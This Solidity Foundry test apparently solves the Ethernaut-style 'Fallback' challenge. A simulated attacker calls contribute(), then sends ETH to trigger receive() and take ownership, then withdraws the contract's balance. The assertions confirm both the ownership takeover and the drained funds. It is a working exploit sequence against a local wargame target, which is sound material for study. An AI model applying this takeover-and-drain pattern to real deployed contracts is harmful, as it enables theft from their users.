// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/Fallback.sol";

contract FallbackTest is Test {
    Fallback target;

    address deployer = address(1);
    address attacker = address(2);

    function setUp() public {
        // give ETH
        vm.deal(deployer, 10 ether);
        vm.deal(attacker, 10 ether);

        // deploy contract
        vm.prank(deployer);
        target = new Fallback();

        // fund contract (important!)
        vm.prank(deployer);
        (bool success, ) = address(target).call{value: 1 ether}("");
        require(success);
    }

    function testExploit() public {
        // Step 1: contribute
        vm.prank(attacker);
        target.contribute{value: 0.0001 ether}();

        // Step 2: trigger receive()
        vm.prank(attacker);
        (bool success, ) = address(target).call{value: 0.0001 ether}("");
        require(success);

        // ✅ check ownership takeover
        assertEq(target.owner(), attacker);

        // Step 3: withdraw
        vm.prank(attacker);
        target.withdraw();

        // ✅ check funds drained
        assertEq(address(target).balance, 0);
    }
}